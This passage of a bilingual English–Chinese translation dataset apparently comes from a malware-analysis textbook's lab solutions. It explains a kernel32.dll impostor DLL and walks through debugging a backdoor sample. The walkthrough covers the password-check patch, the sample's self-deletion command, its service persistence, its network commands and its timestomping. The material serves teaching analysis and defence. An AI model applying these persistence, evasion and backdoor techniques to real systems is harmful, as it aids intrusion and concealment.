    的导入所取代。这意味着系统上的每个可执行文件都将尝试加载我们的恶意 DLL——每一个。
- en: Next, we check to see how the program modified *kernel32.dll* and *Lab07-03.dll*.
    We can calculate the MD5 hash of *kernel32.dll* before and after the program runs
    to clearly see that this malware does not modify *kernel32.dll*.
  id: totrans-2050
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查程序如何修改 *kernel32.dll* 和 *Lab07-03.dll*。我们可以计算程序运行前后 *kernel32.dll* 的
    MD5 哈希值，以清楚地看到这种恶意软件不会修改 *kernel32.dll*。
- en: When we open the modified *Lab07-03.dll* (now named ***kerne132.dll***), we
    see that it now has an export section. Opening it in PEview, we see that it exports
    all the functions that *kernel32.dll* exported, and that these are forwarded exports,
    so that the actual functionality is still in *kernel32.dll*. The overall effect
    of this modification is that whenever an *.exe* file is run on this computer,
    it will load the malicious ***kerne132.dll*** and run the code in DLLMain.
  id: totrans-2051
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们打开修改后的 *Lab07-03.dll*（现在命名为 ***kerne132.dll***），我们看到它现在有一个导出部分。在 PEview 中打开它，我们看到它导出了
    *kernel32.dll* 所导出的所有函数，并且这些都是转发导出，因此实际功能仍在 *kernel32.dll* 中。这种修改的整体效果是，每当在这台计算机上运行
    *.exe* 文件时，它将加载恶意 ***kerne132.dll*** 并运行 DLLMain 中的代码。
- en: Other than that, all functionality will be unchanged, and the code will execute
    as if the program were still calling the original *kernel32.dll*.
  id: totrans-2052
  prefs: []
  type: TYPE_NORMAL
  zh: 除了这些，所有功能将保持不变，代码将像程序仍在调用原始 *kernel32.dll* 一样执行。
- en: We have now analyzed this malware completely. We could create host-and network-based
    signatures based on what we know, or we could write a malware report.
  id: totrans-2053
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经完全分析了这种恶意软件。我们可以根据我们所知创建基于主机和网络签名的签名，或者我们可以编写一份恶意软件报告。
- en: We did gloss over a lot of code in this analysis because it was too complicated,
    but did we miss anything? We did, but nothing of importance to malware analysis.
    All of the code in the main method that accessed *kernel32.dll* and *Lab07-03.dll*
    was parsing the export section of *kernel32.dll* and creating an export section
    in *Lab07-03.dll* that exported the same functions and created forward entries
    to *kernel32.dll*.
  id: totrans-2054
  prefs: []
  type: TYPE_NORMAL
  zh: 在这次分析中，我们确实省略了很多代码，因为它们太复杂了，但我们遗漏了什么吗？我们确实遗漏了一些东西，但都不是对恶意软件分析重要的事情。主方法中访问 *kernel32.dll*
    和 *Lab07-03.dll* 的所有代码都在解析 *kernel32.dll* 的导出部分，并在 *Lab07-03.dll* 中创建一个导出相同的函数并创建转发条目的导出部分。
- en: The malware needs to scan *kernel32.dll* for all the exports and create forward
    entries for the imposter ***kerne132.dll***, because *kernel32.dll* is different
    on different systems. The tailored version of ***kerne132.dll*** exports exactly
    the same functions as the real *kernel32.dll*. In the function that modified the
  id: totrans-2055
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件需要扫描 *kernel32.dll* 中的所有导出，并为冒充者 ***kerne132.dll*** 创建转发条目，因为 *kernel32.dll*
    在不同的系统上不同。定制的 ***kerne132.dll*** 导出与真实 *kernel32.dll* 完全相同的函数。在修改 *kernel32.dll*
    的函数中，
- en: '*.exe*, the code found the import directory, so it could modify the import
    to *kernel32.dll* and set the bound import table to zero so that it would not
    be used.'
  id: totrans-2056
  prefs: []
  type: TYPE_NORMAL
  zh: '*.exe*，找到导入目录的代码，因此它可以修改导入为 *kernel32.dll* 并将绑定导入表设置为零，这样它就不会被使用。'
- en: With careful and time-consuming analysis, we could determine what all of these
    functions do. However, when analyzing malware, time is often of the essence, and
    you should typically focus on what’s important. Try not to worry about the little
    details that won’t affect your analysis.
  id: totrans-2057
  prefs: []
  type: TYPE_NORMAL
  zh: 通过仔细且耗时的分析，我们可以确定所有这些功能的作用。然而，在分析恶意软件时，时间通常至关重要，您通常应该关注重要的事情。尽量不用担心那些不会影响您分析的小细节。
- en: Solutions to Labs
  id: totrans-2058
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**529**'
  id: totrans-2059
  prefs: []
  type: TYPE_NORMAL
  zh: '**529**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2060
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 9-1 Solutions**'
  id: totrans-2061
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 9-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-2062
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-2063
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: You can get the program to install itself by providing it with the -in option,
    along with the password. Alternatively, you can patch the binary to skip the password
    verification check.
  id: totrans-2064
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以通过提供 -in 选项和密码来让程序自行安装。或者，您也可以修补二进制文件以跳过密码验证检查。
- en: 2\.
  id: totrans-2065
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The command-line options for the program are one of four values and the password.
    The password is the string abcd and is required for all actions except the default
    behavior. The -in option instructs the malware to install itself. The -re option
    instructs the malware to remove itself. The
  id: totrans-2066
  prefs: []
  type: TYPE_NORMAL
  zh: 程序的命令行选项是四个值之一和密码。密码是字符串 abcd，并且对于所有操作（除了默认行为）都是必需的。-in 选项指示恶意软件安装自身。-re 选项指示恶意软件删除自身。The
- en: -c option instructs the malware to update its configuration, including its beacon
    IP address. The -cc option instructs the malware to print its current configuration
    to the console. By default, this malware functions as a backdoor if installed.
  id: totrans-2067
  prefs: []
  type: TYPE_NORMAL
  zh: -c 选项指示恶意软件更新其配置，包括其信标 IP 地址。-cc 选项指示恶意软件将其当前配置打印到控制台。默认情况下，如果安装了恶意软件，此恶意软件作为后门运行。
- en: 3\.
  id: totrans-2068
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: You can patch the binary by changing the first bytes of the function at address
    0x402510 to always return true. The assembly instruction for this behavior is
    MOV EAX, 0x1; RETN;, which corresponds to the byte sequence B8 01 00 00 00 C3\.
  id: totrans-2069
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以通过更改地址 0x402510 的函数的第一个字节始终返回 true 来修补二进制文件。这种行为对应的汇编指令是 MOV EAX, 0x1; RETN;，这对应于字节序列
    B8 01 00 00 00 C3\。
- en: 4\.
  id: totrans-2070
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malware creates the registry key HKLM\Software\Microsoft \XPS\ Configuration
    (note the trailing space after Microsoft). The malware also creates the service
    *XYZ* Manager Service, where *XYZ* can be a parameter provided at install time
    or the name of the malware executable. Finally, when the malware copies itself
    into the Windows System directory, it may change the filename to match the service
    name.
  id: totrans-2071
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件创建注册表键 HKLM\Software\Microsoft \XPS\ Configuration（注意 Microsoft 后面的空格）。恶意软件还创建服务
    *XYZ* Manager Service，其中 *XYZ* 可以是在安装时提供的参数或恶意软件可执行文件的名字。最后，当恶意软件将其自身复制到 Windows
    系统目录时，它可能会更改文件名以匹配服务名。
- en: 5\.
  id: totrans-2072
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: 'The malware can be instructed to execute one of five commands via the network:
    SLEEP, UPLOAD, DOWNLOAD, CMD, or NOTHING. The SLEEP command instructs the malware
    to perform no action for a given period of time.'
  id: totrans-2073
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以通过网络执行五个命令之一：SLEEP、UPLOAD、DOWNLOAD、CMD 或 NOTHING。SLEEP 命令指示恶意软件在指定的时间内不执行任何操作。
- en: The UPLOAD command reads a file from the network and writes it to the local
    system at a specified path. The DOWNLOAD command instructs the malware to send
    the contents of a local file over the network to the remote host. The CMD command
    causes the malware to execute a shell command on the local system. The NOTHING
    command is a no-op command that causes the malware to do nothing.
  id: totrans-2074
  prefs: []
  type: TYPE_NORMAL
  zh: UPLOAD 命令从网络读取文件并将其写入本地系统指定的路径。DOWNLOAD 命令指示恶意软件将本地文件的 内容通过网络发送到远程主机。CMD 命令导致恶意软件在本地系统上执行
    shell 命令。NOTHING 命令是一个无操作命令，导致恶意软件不执行任何操作。
- en: 6\.
  id: totrans-2075
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: By default, the malware beacons *http://www.practicalmalwareanalysis.com/*;
    however, this is configurable. The beacons are HTTP/1.0 GET requests for resources
    in the form *xxxx/xxxx.xxx*, where *x* is a random alphanumeric ASCII character.
    The malware does not provide any HTTP headers with its requests.
  id: totrans-2076
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，恶意软件的信标为 *http://www.practicalmalwareanalysis.com/*；然而，这是可配置的。信标是针对形式为
    *xxxx/xxxx.xxx* 的资源的 HTTP/1.0 GET 请求，其中 *x* 是一个随机的字母数字 ASCII 字符。恶意软件在其请求中不提供任何
    HTTP 头部信息。
- en: '***Detailed Analysis***'
  id: totrans-2077
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We start by debugging the malware with OllyDbg. We use the F8 key to step-over
    until we arrive at the address 0x403945, which is the call to the main function.
    (The easiest way to figure out that the main function starts at 0x402AF0
  id: totrans-2078
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先使用OllyDbg调试恶意软件。我们使用F8键单步跳过，直到到达地址0x403945，这是主函数的调用。（确定主函数从0x402AF0开始的最简单方法是查看地址。）
- en: '**530**'
  id: totrans-2079
  prefs: []
  type: TYPE_NORMAL
  zh: '**530**'
- en: Appendix C
  id: totrans-2080
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2081
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 113](index-564_1.png)'
  id: totrans-2082
  prefs: []
  type: TYPE_IMG
  zh: '![Image 113](index-564_1.png)'
- en: is by using IDA Pro.) Next, we use the F7 key to step-into the call to the main
    function. We continue to step forward using F7 and F8 while noting the behavior
    of the sample. (If you accidentally go too far, you can reset execution to the
    beginning by pressing CTRL-F2.)
  id: totrans-2083
  prefs: []
  type: TYPE_NORMAL
  zh: 使用IDA Pro。)接下来，我们使用F7键进入主函数的调用。我们继续使用F7和F8键向前执行，同时注意样本的行为。（如果你不小心走得太远，可以通过按CTRL-F2将执行重置到开始处。）
- en: First, the malware checks to see if the number of command-line arguments equals
    1 at address 0x402AFD. We have not specified any parameters, so the check succeeds,
    and execution resumes at address 0x401000\. Next, it attempts to open the registry
    key HKLM\SOFTWARE\Microsoft \XPS; however, since the registry key does not exist,
    the function returns zero, so execution calls into the function at 0x402410\.
  id: totrans-2084
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，恶意软件在地址0x402AFD检查命令行参数的数量是否等于1。我们没有指定任何参数，所以检查成功，执行从地址0x401000继续。接下来，它尝试打开注册表键HKLM\SOFTWARE\Microsoft
    \XPS；然而，由于注册表键不存在，函数返回零，因此执行调用到地址0x402410的函数。
- en: The function at 0x402410 uses GetModuleFilenameA to get the path of the current
    executable and builds the ASCII string /c del path-to-executable >> NUL. Figure
    9-1L shows an instance of the string in the registers window of OllyDbg. Note
    that the contents of EDX are 0x12E248, but OllyDbg correctly interprets this as
    a pointer to an ASCII string. The malware attempts to delete **9**
  id: totrans-2085
  prefs: []
  type: TYPE_NORMAL
  zh: 在地址0x402410处的函数使用GetModuleFilenameA获取当前可执行文件的路径，并构建ASCII字符串/c del path-to-executable
    >> NUL。图9-1L显示了在OllyDbg的寄存器窗口中该字符串的一个实例。注意，EDX的内容是0x12E248，但OllyDbg正确地将它解释为一个指向ASCII字符串的指针。恶意软件试图删除**9**
- en: itself from the disk by combining the constructed string with program *cmd.exe*
    in a call to ShellExecuteA. Fortunately, we have the file open in OllyDbg, so
    Windows does not allow the file to be deleted. This behavior is consistent with
    what we saw during basic dynamic analysis of the sample in the Chapter 3 labs.
  id: totrans-2086
  prefs: []
  type: TYPE_NORMAL
  zh: 通过将构造的字符串与程序*cmd.exe*在调用ShellExecuteA中结合，从磁盘删除自身。幸运的是，我们在OllyDbg中打开了文件，所以Windows不允许删除该文件。这种行为与我们第三章实验室中对样本进行的基本动态分析时看到的行为一致。
- en: '*Figure 9-1L: The malware prepares to delete itself, as seen* *in the string
    pointer to EDX*'
  id: totrans-2087
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-1L：恶意软件准备从磁盘删除自身，如通过指向EDX的字符串指针所见*'
- en: 'Our next task is to coerce the malware to run properly. We have at least two
    options: we can provide more command-line arguments to satisfy the check at address
    0x402AFD, or we can modify the code path that checks for the registry keys. Modifying
    the code path may have unin-tended effects. Later instructions can depend on information
    stored in these keys, and if that information is changed, the malware could fail
    to execute. Let’s try providing more command-line arguments first, to avoid potential
    issues.'
  id: totrans-2088
  prefs: []
  type: TYPE_NORMAL
  zh: 我们接下来的任务是强制恶意软件正常运行。我们至少有两个选项：我们可以提供更多的命令行参数以满足地址0x402AFD的检查，或者我们可以修改检查注册表键的代码路径。修改代码路径可能会有未预料的效果。后续指令可能依赖于存储在这些键中的信息，如果这些信息被更改，恶意软件可能无法执行。让我们先尝试提供更多的命令行参数，以避免潜在的问题。
- en: Choose any entry from the strings listing, such as -in, and use it as a command-line
    argument to test whether the malware does something interesting. To do this, choose
    **Debug****Arguments**, as shown in Figure 9-2L.
  id: totrans-2089
  prefs: []
  type: TYPE_NORMAL
  zh: 从字符串列表中选择任何条目，例如-in，并将其用作命令行参数来测试恶意软件是否做了有趣的事情。为此，选择**调试****参数**，如图9-2L所示。
- en: Then add the -in argument in the OllyDbg arguments dialog, as shown in Figure
    9-3L.
  id: totrans-2090
  prefs: []
  type: TYPE_NORMAL
  zh: 然后在OllyDbg的参数对话框中添加-in参数，如图9-3L所示。
- en: When the malware is executed with the argument -in, it still tries to delete
    itself, which tells us that the command-line arguments are not yet valid. Let’s
    use OllyDbg to step through the code flow when we give the malware a parameter
    to see what’s happening.
  id: totrans-2091
  prefs: []
  type: TYPE_NORMAL
  zh: 当恶意软件以参数-in执行时，它仍然试图删除自己，这告诉我们命令行参数尚未有效。让我们使用OllyDbg在给恶意软件一个参数时逐步查看代码流程，看看发生了什么。
- en: Solutions to Labs
  id: totrans-2092
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**531**'
  id: totrans-2093
  prefs: []
  type: TYPE_NORMAL
  zh: '**531**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2094
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 114](index-565_1.png)'
  id: totrans-2095
  prefs: []
  type: TYPE_IMG
  zh: '![Image 114](index-565_1.png)'
- en: '![Image 115](index-565_2.jpg)'
  id: totrans-2096
  prefs: []
  type: TYPE_IMG
  zh: '![Image 115](index-565_2.jpg)'
- en: '*Figure 9-2L: Choosing to debug arguments*'
  id: totrans-2097
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-2L：选择调试参数*'
- en: '*Figure 9-3L: Adding the -in argument*'
  id: totrans-2098
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-3L：添加-in参数*'
- en: Listing 9-1L shows the function setup and parameter check.
  id: totrans-2099
  prefs: []
  type: TYPE_NORMAL
  zh: Listing 9-1L显示了函数设置和参数检查。
- en: 00402AF0 PUSH EBP
  id: totrans-2100
  prefs: []
  type: TYPE_NORMAL
  zh: 00402AF0 PUSH EBP
- en: 00402AF1 MOV EBP,ESP
  id: totrans-2101
  prefs: []
  type: TYPE_NORMAL
  zh: 00402AF1 MOV EBP,ESP
- en: 00402AF3 MOV EAX,182C
  id: totrans-2102
  prefs: []
  type: TYPE_NORMAL
  zh: 00402AF3 MOV EAX,182C
- en: 00402AF8 CALL Lab09-01.00402EB0
  id: totrans-2103
  prefs: []
  type: TYPE_NORMAL
  zh: 00402AF8 CALL Lab09-01.00402EB0
- en: 00402AFD
  id: totrans-2104
  prefs: []
  type: TYPE_NORMAL
  zh: 00402AFD
- en: CMP DWORD PTR SS:[EBP+8],1
  id: totrans-2105
  prefs: []
  type: TYPE_NORMAL
  zh: CMP DWORD PTR SS:[EBP+8],1
- en: 00402B01 JNZ SHORT Lab09-01.00402B1D
  id: totrans-2106
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B01 JNZ SHORT Lab09-01.00402B1D
- en: '*Listing 9-1L: Function setup and argc comparison*'
  id: totrans-2107
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 9-1L：函数设置和argc比较*'
- en: We see that after checking a command-line parameter, execution takes the jump
    at 0x402B01\. argc, the number of string arguments passed to the program, is found
    8 bytes above the frame pointer , since it is the first argument to the main
    function.
  id: totrans-2108
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到在检查命令行参数后，执行跳转到0x402B01。argc，传递给程序的字符串参数的数量，位于框架指针上方8字节处，因为它是最先传递给main函数的参数。
- en: 'At 0x402B2E, the last command-line argument is passed into the function that
    starts at address 0x402510\. We know it is the last argument because the main
    function of a standard C program takes two parameters: argc, the number of command-line
    parameters, and argv, an array of pointers to the command-line parameters. EAX
    contains argc, and ECX contains argv, as shown in Listing 9-2L at  and . The
    instruction at  performs pointer **532**'
  id: totrans-2109
  prefs: []
  type: TYPE_NORMAL
  zh: 在0x402B2E，最后一个命令行参数被传递到从地址0x402510开始的函数。我们知道它是最后一个参数，因为标准C程序的主函数接受两个参数：argc，命令行参数的数量，和argv，指向命令行参数的指针数组。EAX包含argc，而ECX包含argv，如Listing
    9-2L中的和所示。处的指令执行指针**532**
- en: Appendix C
  id: totrans-2110
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2111
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: arithmetic to select the last element in the array of command-line parameters.
    This pointer ends up in EAX, and is pushed onto the top of the stack prior to
    the function call.
  id: totrans-2112
  prefs: []
  type: TYPE_NORMAL
  zh: 在数组命令行参数中的最后一个元素之前，该指针最终在EAX中，并在函数调用之前推入栈顶。
- en: 00402B1D MOV EAX,DWORD PTR SS:[EBP+8] ; ARGC
  id: totrans-2113
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B1D MOV EAX,DWORD PTR SS:[EBP+8] ; ARGC
- en: 00402B20 MOV ECX,DWORD PTR SS:[EBP+C] ; ARGV
  id: totrans-2114
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B20 MOV ECX,DWORD PTR SS:[EBP+C] ; ARGV
- en: 00402B23 MOV EDX,DWORD PTR DS:[ECX+EAX*4-4] 
  id: totrans-2115
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B23 MOV EDX,DWORD PTR DS:[ECX+EAX*4-4] 
- en: 00402B27 MOV DWORD PTR SS:[EBP-4],EDX
  id: totrans-2116
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B27 MOV DWORD PTR SS:[EBP-4],EDX
- en: 00402B2A MOV EAX,DWORD PTR SS:[EBP-4]
  id: totrans-2117
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B2A MOV EAX,DWORD PTR SS:[EBP-4]
- en: 00402B2D PUSH EAX
  id: totrans-2118
  prefs: []
  type: TYPE_NORMAL
  zh: 00402B2D PUSH EAX
- en: '*Listing 9-2L: Pointer to the last element in argv is pushed on the stack*
    The basic disassembly view provided by OllyDbg gives a rough overview of the function
    that starts at address 0x402510\. There are no function calls, but by scanning
    the instructions, we see the use of the arithmetic operations **9**'
  id: totrans-2119
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 9-2L：argv的最后一个元素的指针推入栈中* OllyDbg提供的基本反汇编视图给出了从地址0x402510开始的函数的大致概述。没有函数调用，但通过扫描指令，我们看到使用算术运算**9**'
- en: ADD, SUB, MUL, and XOR on byte-sized operands, such as at addresses 0x402532
  id: totrans-2120
  prefs: []
  type: TYPE_NORMAL
  zh: ADD, SUB, MUL, 和 XOR 在字节大小的操作数上，例如在地址0x402532
- en: through 0x402539\. It looks like this routine does a sanity check of the input
    using a convoluted, hard-coded algorithm. Most likely the input is some type of
    password or code.
  id: totrans-2121
  prefs: []
  type: TYPE_NORMAL
  zh: 通过0x402539。看起来这个例程使用复杂的、硬编码的算法对输入进行合理性检查。最有可能的是输入是一种密码或代码。
- en: '**NOTE**'
  id: totrans-2122
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*If you perform a full analysis of 0x4025120, you can determine that the password*
    *is* abcd *. You will be equally successful using the password or the patch method
    we* *explain next.*'
  id: totrans-2123
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果您对0x4025120进行完整分析，可以确定密码* *是* abcd。您使用密码或我们接下来解释的修补方法都会同样成功。*'
- en: Rather than reversing the algorithm, we patch the binary so that the password
    check function at 0x402510 will always return the value associated with a successful
    check. This will allow us to continue analyzing the meat of the malware. We note
    that there is an inline function call to strlen at addresses 0x40251B through
    0x402521\. If the argument fails this check, EAX
  id: totrans-2124
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不是逆向算法，而是修补二进制文件，使0x402510地址处的密码检查函数始终返回成功检查关联的值。这将使我们能够继续分析恶意软件的核心部分。我们注意到在地址0x40251B通过0x402521之间有一个对strlen的函数调用。如果参数未通过此检查，EAX
- en: is zeroed out, and execution resumes at the function cleanup at 0x4025A0\.
  id: totrans-2125
  prefs: []
  type: TYPE_NORMAL
  zh: 被置零，然后从0x4025A0地址处的函数清理处继续执行。
- en: Further reversing reveals that only the correct argument will cause the function
    to return the value 1, but we’ll patch it so that it returns 1 in all cases, regardless
    of the argument. To do this, we insert the instructions shown in Listing 9-3L.
  id: totrans-2126
  prefs: []
  type: TYPE_NORMAL
  zh: 进一步逆向分析发现，只有正确的参数才会使函数返回值1，但我们将修复它，使其在所有情况下都返回1，无论参数如何。为此，我们插入Listing 9-3L中显示的指令。
- en: B8 01 00 00 00 MOV EAX, 0x1
  id: totrans-2127
  prefs: []
  type: TYPE_NORMAL
  zh: B8 01 00 00 00 MOV EAX, 0x1
- en: C3 RET
  id: totrans-2128
  prefs: []
  type: TYPE_NORMAL
  zh: C3 RET
- en: '*Listing 9-3L: Patch code for the password check*'
  id: totrans-2129
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单9-3L：密码检查的补丁代码*'
- en: 'We assemble these instructions using the **Assemble** option in OllyDbg and
    get the 6-byte sequence: B8 01 00 00 00 C3\. Because the CALL instruction prepares
    the stack, and the RET instruction cleans it up, we can overwrite the instructions
    at the very beginning of the password check function, at address 0x402510\. Edit
    the instructions by right-clicking the start address you wish to edit and selecting
    **Binary****Edit**. Figure 9-4L shows the relevant context menu items.'
  id: totrans-2130
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用OllyDbg中的**汇编**选项来组装这些指令，并得到6个字节的序列：B8 01 00 00 00 C3。因为CALL指令准备堆栈，而RET指令清理它，所以我们可以在密码检查函数的非常开始处覆盖指令，地址为0x402510。通过右键单击您希望编辑的起始地址并选择**二进制****编辑**来编辑指令。图9-4L显示了相关的上下文菜单项。
- en: Solutions to Labs
  id: totrans-2131
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**533**'
  id: totrans-2132
  prefs: []
  type: TYPE_NORMAL
  zh: '**533**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2133
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 116](index-567_1.jpg)'
  id: totrans-2134
  prefs: []
  type: TYPE_IMG
  zh: '![Image 116](index-567_1.jpg)'
- en: '![Image 117](index-567_2.jpg)'
  id: totrans-2135
  prefs: []
  type: TYPE_IMG
  zh: '![Image 117](index-567_2.jpg)'
- en: '![Image 118](index-567_3.png)'
  id: totrans-2136
  prefs: []
  type: TYPE_IMG
  zh: '![Image 118](index-567_3.png)'
- en: '*Figure 9-4L: Patching a binary*'
  id: totrans-2137
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-4L：修补二进制文件*'
- en: Figure 9-5L shows the assembled instructions after they have been entered into
    the edit dialog. Since we want to write 6 bytes over a previous instruction that
    took only 1 byte, we uncheck the box labeled **Keep size**.
  id: totrans-2138
  prefs: []
  type: TYPE_NORMAL
  zh: 图9-5L显示了将指令输入编辑对话框后组装的指令。由于我们想在只占用1个字节的先前指令上写入6个字节，所以我们取消选中了标记为**保持大小**的框。
- en: We then enter the assembled hex values in the **HEX+06** field and click **OK**.
  id: totrans-2139
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们在**HEX+06**字段中输入组装的十六进制值，并点击**确定**。
- en: OllyDbg will automatically assemble and display the new instructions at the
    appropriate location. Next, save the changes to the executable by right-clicking
    the disassembly window and selecting **Copy to executable****All** **modifications**.
    Accept all dialogs, and save the new version as *Lab09-01-patched.exe*.
  id: totrans-2140
  prefs: []
  type: TYPE_NORMAL
  zh: OllyDbg将自动在适当的位置组装并显示新指令。接下来，通过右键单击反汇编窗口并选择**复制到可执行文件****所有** **修改**来保存对可执行文件所做的更改。接受所有对话框，并将新版本保存为*Lab09-01-patched.exe*。
- en: To test whether the password check function was successfully disabled, we try
    debugging it with the command-line parameter -in again. This time, the malware
    successfully passes the check at address 0x402510 and jumps to address 0x402B3F.
    Six instructions later, a pointer to the first command-line parameter is pushed
    onto the stack next to a pointer to another ASCII string,
  id: totrans-2141
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试是否成功禁用了密码检查函数，我们再次使用命令行参数-in尝试调试它。这次，恶意软件成功通过了地址0x402510的检查，并跳转到地址0x402B3F。六条指令后，一个指向第一个命令行参数的指针被推入堆栈，旁边是一个指向另一个ASCII字符串的指针，
- en: -in. Figure 9-6L shows the state of the stack at this point.
  id: totrans-2142
  prefs: []
  type: TYPE_NORMAL
  zh: -in. 图9-6L显示了此时的堆栈状态。
- en: '*Figure 9-5L: Inserting new instructions*'
  id: totrans-2143
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-5L：插入新指令*'
- en: '*Figure 9-6L: State of the stack*'
  id: totrans-2144
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-6L：堆栈状态*'
- en: '*at address 0x402B57*'
  id: totrans-2145
  prefs: []
  type: TYPE_NORMAL
  zh: '*在地址0x402B57*'
- en: The function at address 0x40380F is __mbscmp, which is a string-comparison function
    recognized by IDA Pro’s FLIRT signature database. The malware uses __mbscmp to
    check the command-line parameter against a list of supported options that determine
    its behavior.
  id: totrans-2146
  prefs: []
  type: TYPE_NORMAL
  zh: 地址为0x40380F的函数是__mbscmp，这是一个由IDA Pro的FLIRT签名数据库识别的字符串比较函数。恶意软件使用__mbscmp来检查命令行参数是否与一组支持选项匹配，这些选项决定了其行为。
- en: Next, the malware checks that two command-line parameters were provided. Since
    we have provided only one (-in), the check fails, and the malware attempts to
    delete itself again. We can pass this check by providing an additional command-line
    parameter.
  id: totrans-2147
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，恶意软件检查是否提供了两个命令行参数。由于我们只提供了一个(-in)，检查失败，恶意软件再次尝试删除自己。我们可以通过提供一个额外的命令行参数来通过这个检查。
- en: Recall that the last command-line parameter is treated as a password, but since
    we patched the password function, we can provide any string as the password. Set
    a breakpoint at address 0x402B63 so we can quickly return to **534**
  id: totrans-2148
  prefs: []
  type: TYPE_NORMAL
  zh: 回想一下，最后一个命令行参数被视为密码，但由于我们修补了密码函数，我们可以提供任何字符串作为密码。在地址0x402B63设置一个断点，以便我们可以快速返回到**534**
- en: Appendix C
  id: totrans-2149
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2150
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 119](index-568_1.png)'
  id: totrans-2151
  prefs: []
  type: TYPE_IMG
  zh: '![Image 119](index-568_1.png)'
- en: '![Image 120](index-568_2.png)'
  id: totrans-2152
  prefs: []
  type: TYPE_IMG
  zh: '![Image 120](index-568_2.png)'
- en: the command-line parameter check, add a junk command-line argument after -in,
    and restart the debugging process. The malware accepts all the command-line parameters
    and performs its intended behavior.
  id: totrans-2153
  prefs: []
  type: TYPE_NORMAL
  zh: 在命令行参数检查后，添加一个垃圾命令行参数在-in之后，并重新启动调试过程。恶意软件接受所有命令行参数并执行其预期行为。
- en: If we continue to debug the malware, we see the malware attempt to open the
    service manager at address 0x4026CC using the same basename as the malware executable.
    The *basename* is the portion of a path with the directory and file extension
    information stripped. If the service does not exist, the malware creates an autostart
    service with a name in the form *basename* Manager Service, and the binary path
    *%SYSTEMROOT%\system32\<filename>* . Figure 9-7L
  id: totrans-2154
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们继续调试恶意软件，我们会看到恶意软件尝试使用与恶意软件可执行文件相同的 basename 在地址 0x4026CC 打开服务管理器。*basename*
    是路径中去除目录和文件扩展信息的那部分。如果服务不存在，恶意软件将创建一个具有 *basename* Manager Service 名称和二进制路径 *%SYSTEMROOT%\system32\<filename>*
    的自动启动服务。图 9-7L
- en: shows the state of the call stack when CreateServiceA is called and includes
    the ASCII string name, description, and path. At address 0x4028A1, the malware
    copies itself into *%SYSTEMROOT%\ system32\* . The function at address 0x4015B0
    alters the modified, accessed, and changed timestamps of the copy to match those
    of the system file *kernel32.dll*. Modifying timestamps to match another file
    is known as *timestomping*.
  id: totrans-2155
  prefs: []
  type: TYPE_NORMAL
